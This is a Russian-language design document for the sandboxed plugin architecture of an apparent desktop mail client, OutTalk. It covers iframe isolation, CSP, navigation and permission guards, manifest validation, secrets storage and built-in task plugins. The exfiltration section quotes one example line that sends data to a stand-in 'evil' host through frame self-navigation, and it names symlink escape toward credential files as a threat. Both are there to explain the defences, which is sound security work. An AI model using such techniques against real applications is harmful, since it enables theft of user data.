Архитектура плагинов

OutTalk расширяется плагинами — встроенными или сторонними модулями, которые добавляют разделы и явно объявленные действия. Ключевое требование: код iframe не доверен. Он не имеет доступа к window.api, React-дереву хоста, секретам, провайдеру и напрямую к сети; доступ к данным возможен только через узкий, явно объявленный и проверяемый брокером контракт в main.

Термины: плагин OutTalk ≠ надстройка Outlook. На этой странице — плагины OutTalk: наш собственный формат расширений (outtalk-plugin://, манифест плагина, брокер plugins/* в main), встроенные или установленные в приложение. Надстройка Outlook (Office Add-in, в коде — addins) — другое: веб-приложение стороннего поставщика с XML-манифестом, которое администратор Exchange разворачивает для всей организации, чтобы в Outlook появилась кнопка (например, «сервис видеовстреч» в окне встречи). Надстройки Outlook живут в src/main/addins/, не используют ни реестр, ни брокер плагинов и описаны в разделе Exchange: надстройки Outlook (ADR-0139). Третье значение слова — «надстройка» задачи ToDo (todo-overlay.ts, JSON в именованном свойстве OutTalk.Task, ADR-0123) — внутренний формат хранения, к расширениям отношения не имеет.

Граница фаз (важно). Фаза 1 (изоляция) завершена. ADR-0058 добавляет первый узкий вертикальный срез Фаз 2–4: встроенный ToDo-плагин поставляется с приложением, выключен по умолчанию, включается пользователем и получает только собственные todo.*-возможности плюс host-rendered действие над точным письмом. ADR-0060 добавляет второй встроенный плагин (Jira), декларативные настройки плагина в доверенном хосте (включая секреты в keychain) и превращает брокер в диспетчер встроенных обработчиков (plugins/builtin/*). ADR-0070 добавляет третий (Confluence) и вместе с ним первый случай, когда содержимое письма участвует в работе плагина: тело читает и держит main, а плагин получает лишь одноразовый дескриптор черновика. ADR-0079 расширяет contribution-точку действий над письмом выбором цели (picker: хост показывает список, который плагин отдаёт через брокер) и делает задачу ToDo списком писем одной переписки. Общие установка, произвольные mail.*/storage.*, grants-диалог и SDK всё ещё не реализованы; остальные возможности остаются deny-by-default.

Выбранная модель: sandboxed cross-origin iframe + брокер в main

Из рассмотренных вариантов (см. ADR-0018) для v1 выбрана Модель 2: плагин — это статический бандл, который грузится в cross-origin sandbox-iframe внутри доверенного React-хоста (PluginHost), а любая привилегия проходит через единый брокер в main-процессе.

Три границы изоляции наложены друг на друга:

  1. Origin. Плагин живёт по схеме outtalk-plugin://<id>/, чужой для окна приложения (file:///dev-URL). Same-origin policy отрезает его от DOM хоста, window.api и React-дерева.
  2. Sandbox. Iframe помечен sandbox="allow-scripts allow-same-origin" — без allow-top-navigation, allow-popups, allow-forms.

    Следствие, которое стоило трёх молча неработавших кнопок. Без allow-forms браузер блокирует отправку формы до того, как сработает обработчик submit, — обработчик не вызывается вовсе, в консоли кадра остаётся «Blocked form submission…», и наружу это не видно никак. Так не работали поиск обращения, отправка комментария и создание обращения в Jira: кнопка нажимается, и ничего не происходит. Правило: в кадре плагина нет ни одной отправки формы — ни <form>, ни type="submit", ни обработчика submit; кнопка обрабатывается по click, Enter заводится руками (в многострочном поле — ⌘/Ctrl+Enter). Проверяется тестом frame-forms.test.ts по всем встроенным кадрам. Сам sandbox при этом не ослабляется: allow-forms дал бы кадру право на навигацию формой, а взамен не нужен ничего.

  3. CSP. Каждый ответ схемы несёт строгий per-plugin CSP, в котором connect-src 'none' — прямой сети у плагина нет вообще.

Привилегированная схема outtalk-plugin://<id>/

src/main/plugins/protocol.ts регистрирует кастомную схему и отдаёт статику только зарегистрированных плагинов.

Схема объявляется до app.ready (иначе привилегии не применятся) — src/main/index.ts вызывает registerPluginSchemes() внутри startup-callback сразу после single-instance admission, до startAdmittedApplication():

protocol.registerSchemesAsPrivileged([
  { scheme: 'outtalk-plugin',
    privileges: { standard: true, secure: true, corsEnabled: false, supportFetchAPI: false } }
])
  • standard — полноценный origin (иначе iframe не изолируется как отдельный источник).
  • secure — трактуется как защищённый контекст (нужно для service-подобной модели и «безопасного» CSP).
  • corsEnabled: false, supportFetchAPI: false — по этой схеме нельзя делать fetch/CORS-запросы; вместе с connect-src 'none' это закрывает прямую сеть.

Обработчик (registerPluginProtocol, ставится на app.ready) для каждого запроса:

  1. Достаёт id из url.hostname, ищет плагин в реестре (getPlugin); нет → 404.
  2. Резолвит путь только внутри dist/ плагина. Пустой путь / → файл entry из манифеста.
  3. Анти-traversal (лексический): нормализованный путь обязан оставаться внутри distDir (filePath === distDir || filePath.startsWith(distDir + sep)), иначе 403.
  4. Анти-traversal (физический): пути distDir и файла резолвятся через realpathSync, и проверка вхождения повторяется — бандл плагина недоверенный и может содержать симлинк наружу (~/.env.local, файлы safeStorage); символическая ссылка из dist/ не пройдёт.
  5. Отдаёт файл с Content-Type по расширению (белый список MIME), X-Content-Type-Options: nosniff и per-plugin CSP.

Per-plugin CSP

default-src 'none';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self' data:;
connect-src 'none';      ← нет прямой сети — только брокер
frame-src 'none';
object-src 'none';
base-uri 'none';
form-action 'none';

Следствия для автора плагина: скрипты — только внешними файлами (<script src="main.js">, инлайн запрещён); никаких fetch/XHR/WebSocket; картинки/шрифты — из бандла или data:. Любая сеть/данные будущих фаз — через брокер по allowlist.

Закрытые каналы эксфильтрации (по ревью безопасности)

connect-src 'none' не единственный способ вынести данные — поэтому дополнительно:

  • CSP окна-хоста несёт frame-src outtalk-plugin: (src/renderer/index.html) — плагин-фрейм может грузить только свою схему.

  • Рантайм-гард will-frame-navigate (src/main/windows/harden.ts → hardenWebContents, вызывается каждым окном; там же setWindowOpenHandler отказывает window.open с referrer outtalk-plugin:// без safeOpenExternal) — второй рубеж поверх CSP против self-navigation-эксфильтрации. Даже sandboxed-фрейм способен навигировать сам себя (location.href='https://evil/?d=…') — это канал утечки, который connect-src/img-src/frame-src не закрывают (навигация ≠ подгрузка ресурса), а он становится опасен, как только брокер начнёт отдавать плагину данные. Гард ловит навигацию суб-фреймов и запирает их в схеме outtalk-plugin://:

    wc.on('will-frame-navigate', (e) => {
  if (e.isMainFrame) return             // top-frame закрыт will-navigate (см. Безопасность)
  if (e.url.startsWith('outtalk-plugin://')) return
  e.preventDefault()                    // всё внешнее — deny, без browser GET
})

    Эшелонирование навигационных гардов: will-navigate (top-frame) + setWindowOpenHandler (window.open/target=_blank) + will-frame-navigate (суб-фреймы плагинов). Для суб-фрейма любая внешняя схема отклоняется без safeOpenExternal: иначе системный браузер стал бы GET-каналом утечки broker-данных. Осознанное внешнее открытие потребует отдельной host-rendered capability с user gesture.

  • OS-разрешения запрещены плагин-фреймам (session.defaultSession, src/main/index.ts). Без обработчика Electron по умолчанию что-то выдаёт — поэтому ставим оба: недоверенный outtalk-plugin://-origin получает deny на все запросы прав ОС (notifications, clipboard, media/mic/camera, geolocation, …), first-party app-origin — только короткий аллоулист APP_PERMISSIONS (clipboard-sanitized-write; ADR-0064):

    session.defaultSession.setPermissionRequestHandler((_wc, permission, callback, details) => {
  const fromPlugin = (details?.requestingUrl ?? '').startsWith('outtalk-plugin://')
  callback(!fromPlugin && APP_PERMISSIONS.has(permission))
})
session.defaultSession.setPermissionCheckHandler((_wc, permission, origin) => {
  return !origin.startsWith('outtalk-plugin://') && APP_PERMISSIONS.has(permission)
})

    В Фазе 3 запрет станет гейтингом по capabilities манифеста (плагин с объявленной и выданной возможностью сможет запросить конкретное право), а не глухим deny.

  • Плагину НЕ доступен app.openExternal — это тоже сетевой/фишинговый канал; в relay он не обрабатывается и уходит в брокер (deny). Появится позже только как capability + явный жест пользователя.

  • Симлинк-escape в файл-сервере закрыт realpathSync (см. выше).

Реестр установленных и встроенных плагинов

src/main/plugins/registry.ts держит in-memory реестр. Код плагина в main никогда не исполняется — это чистые метаданные.

  • Расположение: сторонние плагины — userData/plugins/<id>/; встроенные — plugins/bundled/<id>/ в dev и resources/bundled-plugins/<id>/ в packaged-сборке (electron-builder.yml.extraResources). В обоих случаях внутри лежат plugin.json и статический dist/.
  • Приоритет id: встроенный корень сканируется первым; пользовательская папка не может подменить тот же id.
  • Включение: plugin-preferences.json в userData хранится атомарно (0600) как явная map id → boolean. Любой плагин — и встроенный, и подброшенный в userData/plugins/ — default-off (enabledPreferences[id] ?? false, ADR-0064): без явного тумблера в Настройках он не получает раздела в NavRail и не исполняет код (прав у него всё равно нет, но фишинговый UI внутри доверенного окна — уже достаточно). getPlugin() возвращает только включённый плагин, поэтому выключенный id не обслуживается протоколом и брокером.
  • Загрузка: loadPlugins() на старте сканирует оба корня (сначала bundled, затем userData/plugins), парсит и валидирует каждый plugin.json; сломанный плагин молча пропускается и не может уронить старт. Отсутствующий, unreadable или ошибочно созданный как обычный файл корень userData/plugins трактуется fail-closed как пустой реестр; regression закрепляет, что readdirSync не оставит невидимый процесс-владелец single-instance lock.
  • Валидация манифеста (validate):
    • id — reverse-DNS-подобный, только нижний регистр (/^[a-z0-9]+([._-][a-z0-9]+)*$/, без path-символов) и обязан совпадать с именем папки (иначе подмена/traversal); нижний регистр = однозначное совпадение id == папка == hostname схемы.
    • apiVersion === 1 — иначе плагин отклоняется (жёсткая привязка к версии контракта).
    • entry — по умолчанию index.html; не может содержать .. или начинаться с /.
    • capabilities — массив bounded-строк; сама декларация прав не даёт: broker дополнительно требует собственный exact allowlist/grant.
    • name ≤ 80 и version ≤ 32 символов (shortText: trim + обрезка; не строка → id / 0.0.0), description ≤ 500 — враждебный манифест не зальёт UI (ADR-0064);
    • contributes.messageListMarks (ADR-0093) → { capability, label }: отметка, которую плагин ставит на строках списка писем; label ≤ 40 символов, capability обязана быть объявлена, иначе точка вклада просто не существует;
    • contributes.links (ADR-0107) → { capability }: «умею узнавать свои ссылки». Та же дисциплина, что у picker, state и messageListMarks: capability обязана быть строкой и стоять в capabilities, иначе точки вклада просто нет. Подробно — ниже;
    • contributes.section → { id, label, icon }; id обязан проходить ID_RE (иначе секции нет), label ≤ 80 (иначе id), icon ≤ 32, по умолчанию puzzle;
    • contributes.messageActions[], contributes.contactActions[], contributes.eventActions[] (ADR-0083), contributes.externalActions[] (ADR-0092 — над объектом, который нарисовал кадр другого плагина) → { id, label, icon, capability, doneLabel?, picker?, state?, subjectPattern? } (subjectPattern осмыслен только у почтовых действий и у остальных игнорируется); действие принимается только если capability объявлена в capabilities; label/doneLabel ≤ 80 символов; picker (ADR-0079) — { capability, emptyLabel? }: действию сначала нужна цель, которую выбирает пользователь; picker.capability — ещё одна capability, которую хост вызовет из главного окна обычным брокером, поэтому она обязана быть объявлена в capabilities, иначе всё действие отбрасывается (не «полуработает»); emptyLabel ≤ 80 символов (длиннее — игнорируется); state (ADR-0092) — { capability }: возможность, которую хост зовёт при отрисовке действия, чтобы показать «уже там» и при повторном открытии объекта; проверяется теми же правилами, что picker, и не объявленная в capabilities так же роняет всё действие; subjectPattern (regex ≤ 200, обязан компилироваться) — только у bundled-плагинов, иначе действие с шаблоном отбрасывается (ReDoS-защита: шаблон выполняется над темой каждого письма; тема обрезается до 300 символов). Хост рисует курируемую lucide-иконку и никогда не принимает HTML/SVG плагина; текст после успеха берётся из ответа обработчика (doneLabel в объекте результата, строка ≤ 80 символов — так плагин сообщает исход, а не фиксированное «готово»; ADR-0079), иначе из манифестного doneLabel, иначе «Готово»; текст ошибки — общий «Не удалось». Так contribution-точка остаётся универсальной для следующих плагинов.

Наружу (в renderer) отдаётся только публичное подмножество без путей ФС:

interface PluginRegistryEntry {
  id: string; name: string; version: string
  builtIn: boolean; enabled: boolean; description?: string
  capabilities: string[]
  section?: { id: string; label: string; icon: string }
  messageActions?: Array<{ id: string; label: string; icon: string; capability: string; doneLabel?: string
                          picker?: { capability: string; emptyLabel?: string }
                          state?: { capability: string }; subjectPattern?: string }>
  contactActions?: …; eventActions?: …; externalActions?: …                 // те же поля (ADR-0083, ADR-0092)
  messageListMarks?: { capability: string; label: string }                  // отметка в списке писем (ADR-0093)
  settings?: { fields: PluginSettingField[]; verifyCapability?: string }   // только у bundled (ADR-0060)
}

PluginInfo (внутренний) дополнительно несёт dir (абсолютный путь установки), entry и точку вклада links ({ capability }, [ADR-0107]) — они не покидают main. links намеренно нет в публичном описателе: опрос ссылки ведёт хост, renderer об этой точке вклада ничего не знает, и отдавать её наружу значило бы расширять поверхность без единого потребителя.

Iframe-брокер сначала авторизует зарегистрированное first-party окно, требует включённый plugin id и проверяет capability ∈ manifest. Затем broker.ts находит встроенный обработчик по точному id (см. «Встроенные обработчики: диспетчер» ниже) и отклоняет capability из handler.hostOnly (todo.addFromMessage, todo.attachToTask, todo.addFromContact, todo.attachContactToTask, todo.addFromEvent, todo.attachEventToTask, jira.openFromMessage): такие действия доступны только через plugin:hostAction, который вызывает trusted PluginHostActions, а main сверяет action id с enabled manifest и exact account scope. Поэтому iframe не может сфабриковать source metadata. Глобальные операции (todo.list/add/update/remove/detachMessage/detachLink/pickTasks/openMessage/openContact/openEvent/syncStatus, все jira.*) дополнительно main-window-only через ctx.authorizeMain() (todo.syncStatus — тоже: строка состояния называет почтовый ящик, ADR-0094); todo.openMessage принимает task id и необязательный messageId (ADR-0079) и открывает только снимок письма из store — названное письмо задачи или, без messageId, первое (id письма при этом переразрешается в main — ADR-0074, см. «Ссылка на письмо переживает переезд»); кадр по-прежнему не может назвать произвольный messageId: значение лишь выбирает одно из писем, уже сохранённых в задаче, иначе not_found. Секреты, тело письма, получатели, учётные данные и объект MailProvider границу не пересекают.

Правила проверки

  • Только встроенные плагины. Сторонний плагин по-прежнему не объявляет настроек: main отдаёт ему settings: undefined (сторонний бандл не должен получать в доверенных Настройках строку «введите пароль»). verifyCapability принимается, только если объявлена в capabilities.
  • Каждое поле проверяется само по себе и отбрасывается целиком, если что-то в нём не так: неизвестный вид, атрибут чужого вида (options у числа, min у переключателя), умолчание, не подходящее виду, длинное описание, scope: 'mailbox' у секрета, when на себя, на поле ниже или на секрет. Поле, которое хост не может описать точно, не рисуется вовсе. Исключение — прежние необязательные подписи: слишком длинные placeholder или help просто не показываются, само поле остаётся (как до этапа 3).
  • choice больше чем с 4 вариантами (MAX_CHOICE_OPTIONS) превращается в select ещё при проверке: кнопками столько не помещается.
  • select / choice без default получают на странице первым вариантом «Не выбрано» (пустое значение): строка не выдаёт чужой вариант за выбранный.
  • Не больше 32 полей; пустой вклад = «настроек нет». Условие показа только по полю выше исключает циклы.
  • Весь текст поля — обычный текст. label, description, help, keywords, подписи вариантов хост выводит только как текст (React экранирует его сам); ни HTML, ни Markdown не разбираются.

Хранение

  • Обычные значения (main/plugins/plugin-settings.ts) — userData/plugin-data/<id>.settings.json: { version: 1, values, byAccount? } (атомарно, 0600). Пустая строка — «не задано», то есть умолчание. Файлы, записанные до этапа 3, читаются без изменений (у «Задач» autoAttach уже был on/off, у Jira числа хранились строками).
  • byAccount — значения полей scope: 'mailbox' по номеру ящика (byAccount[<accountId>][<key>]). Номер проверяется (^[A-Za-z0-9._:@-]{1,128}$, в том числе acc_<uuid>; имена __proto__, constructor, prototype и подобные отвергаются), ящиков — не больше 64, читаются только собственные ключи (Object.hasOwn). Удалённый ящик или ящик под тем же номером после смены сервера (ADR-0078) забывает свои значения во всех плагинах: ipc/mail.ts зовёт forgetPluginAccount(pluginIds, accountId); значения приложения и секреты остаются. Встроенному обработчику значения ящика отдаёт readPluginAccountValues(pluginId, accountId). У встроенных плагинов пока ни одно поле не объявлено mailbox — механизм готов.
  • Секреты — userData/plugin-secrets.json { <pluginId>: { <key>: { enc, encrypted } } } через safeStorage (та же политика, что у паролей ящиков: packaged без keychain → отказ, dev — base64-фолбэк). Секрет всегда один на приложение, по ящикам не делится. Оба файла читаются fail-closed; путь к файлу в ошибку не попадает.

Что видит окно

PluginSettingsSnapshot { values: Record<key,string>, secrets: Record<key,boolean> } — секрет никогда. Значения полей ящика есть в снимке, только если он прочитан для ящика (plugin:getSettings(id, accountId)), и это значения именно этого ящика. На странице снимки держит settings/plugin-values.ts (usePluginValues, ключ pluginId или pluginId|accountId; к мосту — через обёртку lib/plugins.ts, Plugins.getSettings / Plugins.setSettings); адаптер строки (pluginAdapter) переводит сохранённые строки в значения строки и обратно (decodePluginValue / encodePluginValue: on/off ↔ true/false, число ↔ десятичная строка, '' — умолчание).

  • Запись. Секрет write-only: новая строка — заменить, null («Удалить») — удалить, пустая строка — не менять. Текст и адрес записываются по уходу из поля или по Enter; переключатель, выбор и число — сразу. Ответ main становится новым снимком; снимки того же плагина для других ящиков перечитываются (значения приложения и секреты у них общие).
  • Проверка в main (normalizeValue): url — как в таблице выше (общая util/service-url.ts → validServiceUrl; проверка идёт уже после normalizeValues; Jira-обработчик повторяет её в точке использования — readJiraConfig отвергает baseUrl не по https://, чтобы подправленный на диске файл не увёл PAT на http://, ADR-0064); select / choice — только объявленный value; toggle — только on или off поля; number — numberFits (до 10 цифр и до 9 знаков после точки, в границах, на шаге). Поле mailbox без ящика не пишется: «Не указан ящик для настройки плагина».
  • Нормализация ввода (ADR-0071): необязательный хук обработчика normalizeValues(patch) вызывается в plugin:setSettings до writePluginSettings, то есть до проверки по манифесту. Человек настраивает сервис, имея под рукой открытую в браузере страницу, а не голый корень: Confluence достаёт ключ пространства из /display/KEY/…, /spaces/KEY/…, ?spaceKey=…, pageId — из ?pageId=… и /pages/<id>/…, адрес сервера обрезает до корня (общая util/service-url.ts → serviceRoot(value, tailSegments), тем же пользуется Jira для своего baseUrl). Хук видит только обычные поля (секреты ему не передаются) и не может добавить ключ, которого окно не присылало; что разобрать не удалось — отвергается прямо при сохранении текстом с примером. Слой настроек остаётся плагин-агностичным: знание про адреса сервиса живёт в его обработчике.
  • Каналы: plugin:getSettings(id, accountId?) / plugin:setSettings(id, patch, accountId?) — только главное окно. accountId (форма окна, демо — '') проходит тот же todoAccount, что у «Где хранить задачи»: строка ≤ 512, известный ящик, право окна на него, канонизация демо-ящика. Main принимает запись и у выключенного плагина, но страница строки выключенного плагина блокирует (см. Настройки). После записи — forget() обработчика и push plugin:dataChanged, чтобы открытый фрейм перечитал состояние. Снимки страница читает при открытии местным каналом — без сервера почты.
  • «Проверить подключение»: хост вызывает verifyCapability через plugin:invoke (обычная capability; кнопка активна только у включённого плагина) и показывает PluginVerifyResult { ok, message } обычным текстом внизу карточки (components/settings/PluginRows.tsx → PluginVerifyFooter).
  • Что видит плагин: только то, что его main-обработчик решит отдать (для Jira — jira.status без токена). Общей capability «прочитай мои настройки» нет: секреты читает лишь readPluginSecret() внутри main.

Чья это ссылка: точка вклада links (ADR-0107)

Объект другого плагина кладут на задачу из приложения (ADR-0092) — но ссылку человек приносит из буфера обмена, и что она означает, знает только владелец адреса. Поэтому появилась точка вклада, симметричная messageListMarks: плагин объявляет возможность, которая по адресу отвечает «это моя страница» или «не моя».

"capabilities": ["confluence.resolveLink"],
"contributes": { "links": { "capability": "confluence.resolveLink" } }

Контракт возможности. На вход — { url } (строка, целиком как её вставил человек). На выход — { key, title } про свой объект или null/что угодно другое, если адрес не свой. Типы — PluginLinkContribution и PluginLinkMatch в src/shared/mail-types.ts.

Кто спрашивает. Не тот плагин, которому нужна ссылка, а хост: ipc/plugins.ts → resolveLinkOf(sender, url) перебирает listPlugins() в порядке реестра, пропускает тех, у кого нет links или кто выключен (getPlugin), и для каждого зовёт resolvePluginLink в broker.ts. Тот проверяет ровно то же, что и любой вызов: объявлена ли названная capability в манифесте, есть ли встроенный обработчик — и вызывает handler.invoke(capability, { url }, ctx).

  • Первый узнавший побеждает. Два раздела не должны спорить за один адрес; если такое случится, выигрывает тот, кто раньше в реестре (bundled сканируются первыми), и поведение остаётся предсказуемым.
  • Исключение — не ошибка человека. Плагин не разобрал адрес или не достучался до сервера → его ответ отбрасывается, и спрашивается следующий. Не узнал никто — null.
  • Ответ обрезается в main: key — непустая строка ≤ 128 символов, title — строка ≤ 200 символов после trim(), пустая подпись заменяется самим ключом. Наружу уходит { pluginId, key, title }, где pluginId подставляет main по опрошенному плагину — назваться чужим плагином ответ не может.
  • Спрашивает главное окно. Зависимость обработчика (сегодня — todo.attachLink) не передаёт свой sender: ipc/plugins.ts берёт getMainWindow() и строит BuiltinContext от него, поэтому опрашиваемый плагин видит обычный main-window-вызов, а закрытое главное окно даёт not_found.

Что делать с узнанной ссылкой — дело спросившего. Плагин задач кладёт её как обычное вложение-объект (TodoExternalLink, см. ниже); открывает потом владелец — через тот же openPluginItem, что и любой чужой объект.

Встроенные обработчики: диспетчер (plugins/builtin/*)

Одно отображение «вид → список манифеста». actionsForKind(plugin, kind) в shared/mail-types.ts — им пользуются и main (какое действие вообще можно выполнить), и рендерер (какие кнопки рисовать); четвёртый вид объекта не сможет разъехаться между ними.

Люди и встречи в задачах (ADR-0083). Плагин «Задачи» объявляет contactActions и eventActions с теми же двумя действиями, что и над письмом («Добавить в задачи», «Добавить к задаче…» с тем же picker), и capability todo.addFromContact / todo.attachContactToTask / todo.addFromEvent / todo.attachEventToTask (все hostOnly), плюс main-window-only todo.detachLink, todo.openContact, todo.openEvent. Снимки проверяет contactSource / eventSource (builtin/types.ts): адрес ≤ 320, id встречи проходит isValidItemId, начало — ISO-инстант. Открытие устроено как у письма: кадр называет задачу и ключ вложения (адрес или id встречи), main находит вложение на самой задаче и шлёт главному окну contact:reveal / calendar:reveal — произвольного человека или встречу кадр назвать не может.

broker.ts больше не знает ни одного плагина по имени. ipc/plugins.ts собирает Map<pluginId, BuiltinPluginHandler> (createTodoHandler, createJiraHandler, createConfluenceHandler, createOrgchartHandler) и на каждый вызов строит BuiltinContext, привязанный к sender: authorizeMain(), authorizeAccount(accountId), openMessage, openExternal (через safeOpenExternal), openPlugin(payload) (push plugin:open главному окну + фокус), openPluginWindow(payload) (показать раздел этого плагина в отдельном окне сразу на нужном объекте, ADR-0105; ящик окна берётся у окна-просителя, поэтому хук годится плагину, чьи данные к ящику не привязаны). Помимо invoke/hostAction брокер обслуживает два адресных вызова: openPluginItem(plugin, key, …) — «покажи свой объект» (ADR-0092) и resolvePluginLink(plugin, url, …) — «чья это ссылка» (ADR-0107, см. выше); оба идут через те же проверки. Брокер проверяет: плагин включён ∧ capability ∈ манифест ∧ builtIn ∧ есть обработчик с тем же id ∧ capability не в handler.hostOnly — и только затем вызывает handler.invoke(capability, args, ctx). Для plugin:hostAction — handler.hostAction(kind, action, args, ctx) при условии, что action объявлен в манифесте и его capability — в capabilities. Обработчик не видит sender, провайдеры, учётные данные и window.api. Два необязательных хука контракта зовёт не брокер, а сам IPC-слой: forget() — при plugin:setEnabled(false) и при записи настроек, чтобы обработчик выбросил то, что держит в памяти для пользователя (ADR-0070); normalizeValues(patch) — в plugin:setSettings до writePluginSettings, чтобы обработчик привёл вставленную из браузера ссылку к значению, которое ждёт его API (ADR-0071; порядок: normalizeValues → запись → forget() → push plugin:dataChanged).

Встроенный ToDo (com.outtalk.todo)

Плагин лежит в plugins/bundled/com.outtalk.todo (манифест — версия 2.0.0), но до явного тумблера «Настройки → Плагины» не показывается в NavRail, не обслуживается outtalk-plugin:// и не может вызвать брокер. После включения появляется раздел «Задачи» и два действия над письмом — «Добавить в задачи» и «Добавить к задаче…» (ADR-0079):

  • в тулбаре одиночного письма и отдельного окна;
  • в действиях каждого раскрытого письма беседы (точный item, а не latest fallback).

Ту же пару действий манифест объявляет над человеком и встречей (contactActions/eventActions, ADR-0083) и над объектом другого плагина (externalActions, ADR-0092), а ещё отметку в списке писем (messageListMarks, ADR-0093) и одно поле настроек — «Складывать письма в задачи самому».

Выбор цели (picker) — общая contribution-точка, не ToDo-специфика. Хост (PluginHostActions) у действия с picker ставит кнопке aria-haspopup="listbox"/aria-expanded; клик не выполняет действие, а открывает под кнопкой (в компактном ряду беседы — под самой иконкой, а для действия из меню «⋯» — под кнопкой «⋯») список data-testid="plugin-action-picker" (role="listbox", aria-label = подпись действия). Вызов — plugin:invoke(pluginId, picker.capability, messageActionArgs(accountId, message)): плагин получает тот же снимок письма, что и действие, и может сузить выбор под письмо; в main аргументы обоих каналов проходят один scopedArgs (ipc/plugins.ts: канонизация демо-ящика '' → 'demo'). Пока ответа нет — «Загрузка…»; ответ разбирается защитно (parseChoices): только объекты с непустым строковым id ≤ 128 и непустым строковым label, подпись обрезается до 120 символов, не больше PLUGIN_PICKER_MAX_CHOICES = 50 пунктов (константа в shared/mail-types.ts, ею же ограничивает ответ плагин); выбор может нести parent — id более раннего выбора верхнего уровня: хост рисует его с отступом и маркером «↳» (data-parent на role="option"), вложенность одна, а parent, не указывающий на такой выбор, отбрасывается — выбор рисуется плоско (ADR-0122); поиск видит вложенность: подошедший вложенный выбор оставляет рядом родителя, подошедший родитель — всех своих детей; пустой список — picker.emptyLabel (без него — «Выбирать не из чего»); Result.error брокера — его текст в том же месте. Пункт — role="option", подпись в две строки (полная — в title); от PICKER_SEARCH_FROM = 6 пунктов над списком появляется поиск по подстроке (Enter берёт первое совпадение), поэтому role="listbox" — на внутреннем прокручиваемом блоке, а data-testid остаётся на внешнем. Выбор закрывает список и зовёт действие с targetId = choice.id. Список закрывается по Escape (на перехвате, с stopImmediatePropagation — иначе то же нажатие закрыло бы и диалог ADR-0092, из которого его открыли), mousedown вне него и повторному клику по кнопке; открыт максимум один (состояние — { key, choices | null, error? } плюс строка поиска на компонент). Плагин отдаёт только выбор и слова, хром — хоста; ни HTML, ни иконок плагина в списке нет. В отдельном окне письма (windows/MessageWindow.tsx, <MessagePluginActions pickers={false}> (обёртка над PluginHostActions)) действия с picker не показываются вовсе: picker-capability отвечает только главному окну (ctx.authorizeMain()), и кнопка, которая всегда упрётся в отказ, там не нужна.

Trusted host передаёт metadata без тела/вложений; main применяет явные лимиты и отклоняет, а не молча обрезает source identity. С ADR-0074 messageId в снимке проверяется не только по длине, но и по форме (isValidItemId из util/ids.ts): раньше сохранённый id уходил только в открытие окна, а теперь main сам бьёт им в EWS (EmailMessage.Bind), где значение попадает в атрибут SOAP, который writer либы не экранирует (Безопасность). Форма задачи — общий wire-контракт TodoItem/TodoMessageSource в src/shared/mail-types.ts (единый источник типов: то же, что main отдаёт в iframe через Result<TodoItem>). Нечитаемый файл хранилища — fail-closed, но по-разному для файла и для отдельной записи (ADR-0112). Судьбу ФАЙЛА решают только структура и версия: не разобрался как JSON, items не массив, записей больше MAX_ITEMS, версия новее известной — тогда путь пишется в лог main, а в плагин уходит текст без пути userData: «Файл задач прочитать не удалось — он оставлен нетронутым, ничего не потеряно. Если недавно менялась версия приложения, задачи можно вернуть из почты: Настройки → Плагины → Задачи → перенос задач». Отдельная запись, не прошедшая validItem, файл не роняет: TodoStore.sift() откладывает её в карантин — она не показывается и не правится, но хранится байт в байт и при каждой записи возвращается в тот же items нетронутой, поэтому версия, которая её поймёт, прочтёт её как ни в чём не бывало (тихо выбросить такую запись было бы хуже отказа: первая же галочка переписала бы файл без неё). Сколько записей отложено — TodoStore.quarantined(); связь на карантинную задачу сохраняется (задача никуда не делась), а висячую и повторную связь store по-прежнему чинит сам. Писатель остаётся строгим: карантин ослабляет только читателя. TodoStore хранит до 1000 задач в userData/plugin-data/com.outtalk.todo.json и публикует файл атомарно. Обычная задача имеет название, срок, completed и пустой messages; задача из письма несёт список снимков писем (TodoItem.messages, не больше MAX_MESSAGES_PER_TASK = 50; ADR-0079, см. следующий раздел). UI плагина умеет создать, переименовать, назначить срок, завершить/вернуть, удалить, открыть любое из писем задачи и убрать письмо из неё. После host-action main отправляет plugin:dataChanged; PluginHost передаёт безопасное событие активному iframe, который перечитывает store — добавление из отдельного окна видно без remount. Сам iframe по-прежнему не имеет preload/Node/сети.

VIP на задачах (ADR-0159, ADR-0161)

Лица VIP в ленте и карточке (постановщик, исполнитель, участники, исполнитель пункта, лица аналитики), письма от VIP и сами VIP среди приложенных людей помечаются тем же языком, что в почте и календаре: тонкий золотой край и мягкий свет у лица, а без лица — свет от левого края строки и слово «VIP». Знак не только цветом: к aria-label/title лица добавляется «, VIP», в кнопку строки вложения — скрытое <span class="sr vip-sr">, VIP</span>; в высокой контрастности свет заменяет обводка CanvasText.

Откуда кадр знает, кто VIP. Список VIP живёт в окне (ручной — в настройках ящика, из каталога — в памяти окна, ADR-0153), в main его нет, и в кадр он не попадает. Вопрос решается в два шага:

  1. Кадр зовёт todo.vipPeople без аргументов (OT.vip.refresh() в app.js: после каждого reload(), после replace() одной задачи и по событию хоста vipChanged; одновременно — один вопрос, событие в полёте — переспрос). Main (todo.ts → todoVipCandidates(listIn(scope)), src/main/plugins/todo-vip.ts) после authorizePluginData() называет пары «ящик + адрес» людей на задачах ящика вызова: исполнитель, постановщик, участники, исполнители пунктов, отправители приложенных писем, приложенные люди. Ящик пары — ящик задачи (home), у задачи без ящика — ящик самого объекта; ext:-ящики, имена без адреса, мусор и повторы отбрасываются; не больше TODO_VIP_CANDIDATES_MAX = 2000. Только память: ни сети, ни диска, запросов к почтовому серверу нет.
  2. Доверенный PluginHost перехватывает ответ этой возможности (PLUGIN_VIP_CAPABILITIES), проверяет форму (parseVipCandidates: строки, длины, не больше 2000; демо-ящик demo → '', как везде в окне) и отдаёт кадру { vip, super } — адреса, которые VIP в своём ящике, и из них — супер-VIP (vipTiersAmong(candidates, getVipLists), тип ответа PluginVipAnswer; с ADR-0161, раньше — { vip } через vipAddressesAmong). Уровень каждого человека — vipTierOf по паре списков его ящика (эффективный VIP + ручной супер-VIP; ящики равноправны, списки у каждого свои); super — всегда подмножество vip, оба без повторов, в нижнем регистре. Отказ main уходит кадру как есть. Main при этом не менялся: он по-прежнему называет только кандидатов.

Кадр держит набор адресов (OT.vip), размечает узлы при создании (OT.vip.decorate в withPhoto для лиц с data-face, в attachmentRow для писем и людей с data-vip-addr, в аналитике для .ava) и перекрашивает уже нарисованные после ответа (OT.vip.paint): data-vip="1" плюс слово «VIP» в подписи; снятый VIP теряет и знак, и слово (исходные подписи помнятся в data-vip-base-*). Встречи и объекты других плагинов людьми не являются и не помечаются.

